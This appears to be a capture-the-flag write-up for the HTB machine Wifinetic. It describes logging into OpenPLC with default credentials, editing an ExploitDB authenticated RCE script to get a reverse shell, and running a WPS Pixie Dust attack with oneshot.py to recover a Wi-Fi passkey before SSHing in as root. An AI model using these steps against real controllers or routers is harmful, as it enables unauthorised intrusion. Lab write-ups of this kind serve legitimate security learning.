nmap : 
	22, 8080

`<ip>:8080` leads to a OpenPLC login page .   `here <ip. refers to the htb machine ip`.

Googling default creds for OpenPLC login page bear fruit.

I now have access to a dashboard.
Googling here , there is a Authenticated RCE . (exploitDB)

Just edit a line inside the exploit file:
`compile_program = options.url + '/compile-program?file=blank_program.st'`

"blank_program.st" will be the program's name that was mentioned in the dashboard/webGUI , so we I had to edit the exploit file accordingly. (after enum.)

After getting the rev shell, we can get the user flag.

----

Path to PRIV ESC:
--
Since the name is Wifinetic, it surely has something to do with wifis.

***WPS Pixie Dust attack*** can be of help here.
(from google:
`Wi-Fi Protected Setup (WPS) was introduced in 2006 for home users who wanted to connect to their home network without the trouble of remembering complex passwords for the Wi-Fi. It used an eight digit pin to authenticate a client to the network. A pixie dust attack is a way of brute forcing the eight digit pin. This attack allowed the recovery of the pin within minutes if the router was vulnerable. On the other hand, a simple brute force would have taken hours. In this recipe, you will learn how to perform a pixie dust attack.`)


There is a tool for this attack: `oneshot.py`
from the github: 
```
Show avaliable networks and start Pixie Dust attack on a specified network:
sudo python3 oneshot.py -i wlan0 -K
```
then, follow the instructions and provide the bssid

We get the passkey of the wifi:
`NoWWEDoKnowWhaTisReal123!`

Now we need the ip for wlan0
follow dis:  https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant

then do this
 ```
 wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config
 wpa_supplicant -B -c config -i wlan0
 ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
 ssh root@192.168.1.1
 cat root.txt
```

Pwnd!
